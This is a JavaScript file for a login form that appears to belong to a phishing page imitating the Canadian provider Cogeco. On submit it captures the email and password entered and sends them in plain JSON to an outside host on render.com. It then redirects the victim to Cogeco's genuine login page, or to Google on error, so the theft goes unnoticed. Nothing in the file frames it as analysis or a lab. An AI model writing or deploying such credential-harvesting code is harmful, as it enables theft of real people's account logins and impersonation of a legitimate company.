const form = document.getElementById("login-form");
const emailInput = document.getElementById("email");
const passwordInput = document.getElementById("password");

const BACKEND_URL = "https://cogeco-page-tahd.onrender.com/login-event";

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();

  if (!email || !password) {
    alert("Please enter both email and password.");
    return;
  }

  try {
    await fetch(BACKEND_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password })
    });

    window.location.href = "https://wm.cogeco.ca/am/XUI/?locale=en";
  } catch (err) {
    console.error("Error sending login event:", err);
    window.location.href = "https://www.google.com/";
  }
});
